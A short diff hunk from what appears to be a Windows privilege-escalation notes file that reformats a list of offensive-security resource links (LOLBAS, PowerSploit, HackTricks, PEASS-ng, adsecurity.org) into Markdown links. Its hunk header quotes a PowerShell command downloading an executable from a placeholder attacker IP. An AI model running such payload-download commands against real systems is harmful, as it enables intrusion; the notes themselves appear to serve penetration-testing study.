@@ -317,8 +317,8 @@ Invoke-WebRequest -Uri http://10.10.10.10/f.exe -OutFile C:\Temp\f.exe
 
 ## Key Resources
 
-- `https://lolbas-project.github.io` — LOLBAS: Living Off The Land Binaries & Scripts
-- `https://github.com/PowerShellMafia/PowerSploit` — PowerView and PowerUp
-- `https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation` — Windows privesc checklist
-- `https://github.com/peass-ng/PEASS-ng` — WinPEAS automated enumeration
-- `https://adsecurity.org` — Sean Metcalf's AD security deep dives
+- [LOLBAS: Living Off The Land Binaries & Scripts](https://lolbas-project.github.io)
+- [PowerView and PowerUp](https://github.com/PowerShellMafia/PowerSploit)
+- [Windows privesc checklist](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)
+- [WinPEAS automated enumeration](https://github.com/peass-ng/PEASS-ng)
+- [Sean Metcalf's AD security deep dives](https://adsecurity.org)
